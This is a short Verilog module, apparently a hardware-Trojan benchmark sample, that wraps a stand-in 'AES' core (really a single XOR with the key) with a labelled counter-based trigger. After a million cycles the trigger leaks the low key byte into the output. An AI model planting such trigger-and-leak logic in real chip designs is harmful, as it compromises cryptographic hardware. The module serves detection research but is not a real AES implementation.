// AES-T200: Sequential Trojan with counter-based trigger

module aes_t200(
    input clk,
    input rst,
    input [127:0] data_in,
    input [127:0] key,
    output reg [127:0] data_out,
    output reg valid
);

    reg [127:0] state;
    reg [3:0] round_cnt;

    // Trojan: Counter-based trigger
    reg [31:0] trigger_counter;
    reg trojan_active;
    wire Tj_trigger = (trigger_counter == 32'd1000000);

    // Trojan payload registers
    reg [7:0] Trojan_payload_reg;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            state <= 128'b0;
            round_cnt <= 4'b0;
            valid <= 1'b0;
            trigger_counter <= 32'b0;
            trojan_active <= 1'b0;
            Trojan_payload_reg <= 8'b0;
        end else begin
            trigger_counter <= trigger_counter + 1;

            // Normal operation
            state <= data_in ^ key;
            round_cnt <= round_cnt + 1;

            if (round_cnt == 4'd10) begin
                // Trojan: corrupt output after trigger
                if (Tj_trigger || trojan_active) begin
                    trojan_active <= 1'b1;
                    Trojan_payload_reg <= key[7:0];
                    data_out <= state ^ {120'b0, Trojan_payload_reg};
                end else begin
                    data_out <= state;
                end
                valid <= 1'b1;
            end
        end
    end

endmodule
